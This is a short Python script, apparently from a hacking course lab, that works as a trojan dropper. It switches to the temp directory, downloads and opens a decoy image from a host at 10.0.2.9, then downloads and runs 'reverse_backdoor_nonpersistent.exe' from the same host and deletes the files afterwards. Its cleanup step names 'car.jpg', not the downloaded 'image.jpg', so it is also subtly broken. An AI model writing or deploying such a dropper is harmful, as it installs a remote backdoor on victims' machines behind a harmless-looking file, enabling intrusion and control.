#!/usr/bin/env python 

import requests
import re
import subprocess
import os
import tempfile

def download(url):
    get_response = requests.get(url)
    
    # Accessing the last element of the list (i.e actual file name)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

# Getting the temp directory
temp_directory = tempfile.gettempdir()

# Changing the working directory
os.chdir(temp_directory)
        
download("http://10.0.2.9/EvilFiles/image.jpg")

# The check_output pauses the program until the execution of the function completes
subprocess.Popen("image.jpg", shell=True)

# Downloading and executing the evil file
download("http://10.0.2.9/EvilFiles/reverse_backdoor_nonpersistent.exe")
# call() is used so that the program pauses until hacker exits 
subprocess.call("reverse_backdoor_nonpersistent.exe", shell=True)

# Removing both files 
os.remove("car.jpg")
os.remove("reverse_backdoor_nonpersistent.exe")